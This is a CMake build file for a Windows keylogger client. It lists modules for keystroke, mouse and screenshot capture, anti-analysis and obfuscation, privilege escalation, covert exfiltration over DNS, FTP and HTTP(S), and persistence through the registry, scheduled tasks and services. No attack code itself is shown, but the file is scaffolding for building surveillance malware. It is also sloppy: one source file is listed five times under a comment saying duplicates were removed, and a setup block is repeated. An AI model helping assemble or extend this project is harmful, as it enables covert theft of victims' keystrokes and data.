# KeyLoggerClient/CMakeLists.txt (optimized version)
cmake_minimum_required(VERSION 3.15)
project(KeyloggerClientProject)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Always define Windows-specific macros when targeting Windows
if(CMAKE_SYSTEM_NAME STREQUAL "Windows")
    if(MSVC)
        # MSVC sẽ cần Windows SDK
        find_package(WindowsSDK REQUIRED)
        include_directories(${WINDOWSSDK_INCLUDE_DIRS})
    else()
        # MinGW: bỏ qua Windows SDK
        message(STATUS "Using MinGW - skipping Windows SDK lookup")
    endif()

    find_package(Crypto REQUIRED)
    include_directories(${CRYPTO_INCLUDE_DIRS})
endif()

list(APPEND CMAKE_MODULE_PATH "${CMAKE_SOURCE_DIR}/cmake")

# Include directories
include_directories(
    include
    include/core
    include/data
    include/hooks
    include/security
    include/utils
    include/communication
    include/persistence
)

# Conditional dependency finding based on target system
if(CMAKE_SYSTEM_NAME STREQUAL "Windows")
    find_package(WindowsSDK REQUIRED)
    include_directories(${WINDOWSSDK_INCLUDE_DIRS})
    
    find_package(Crypto REQUIRED)
    include_directories(${CRYPTO_INCLUDE_DIRS})
endif()

# Source files (removed duplicates)
set(SOURCES
    src/main.cpp
    src/core/Application.cpp
    src/core/Configuration.cpp
    src/core/Logger.cpp
    src/data/DataManager.cpp
    src/data/KeyData.cpp
    src/data/Screenshot.cpp 
    src/data/SystemData.cpp
    src/hooks/KeyHook.cpp
    src/hooks/MouseHook.cpp
    src/hooks/SystemHook.cpp
    src/security/AntiAnalysis.cpp
    src/security/Encryption.cpp
    src/security/Obfuscation.cpp
    src/security/PrivilegeEscalation.cpp
    src/utils/FileUtils.cpp
    src/utils/StringUtils.cpp
    src/utils/SystemUtils.cpp
    src/utils/TimeUtils.cpp
    src/communication/CommsManager.cpp
    src/communication/DnsComms.cpp
    src/communication/FtpComms.cpp
    src/communication/HttpComms.cpp
    src/persistence/PersistenceManager.cpp
    src/persistence/RegistryPersistence.cpp
    src/persistence/SchedulePersistence.cpp
    src/persistence/ServicePersistence.cpp
        src/communication/HttpsComms.cpp
        src/utils/DataUtils.cpp
        src/utils/NetworkUtils.cpp
        src/security/StealthComms.cpp
        src/persistence/BasePersistence.cpp
        src/data/Windows.cpp
        include/data/BatchData.h
        src/communication/CommsManager.cpp
        src/communication/CommsManager.cpp
        src/communication/CommsManager.cpp
        src/communication/CommsManager.cpp
)

# Add executable
add_executable(KeyloggerClientProject ${SOURCES})

# Platform-specific linking
if(CMAKE_SYSTEM_NAME STREQUAL "Windows")
    target_link_libraries(KeyloggerClientProject
        ${WINDOWSSDK_LIBRARIES}
        ${CRYPTO_LIBRARIES}
        # Windows-specific libraries
        kernel32
        user32
        gdi32
        winspool
        shell32
        ole32
        oleaut32
        uuid
        comdlg32
        advapi32
        winhttp
        wininet
        dnsapi
        taskschd
        psapi
        iphlpapi
        gdiplus
        shlwapi
    )
endif()

# Copy configuration files
file(COPY resources/config/default.cfg DESTINATION ${CMAKE_BINARY_DIR})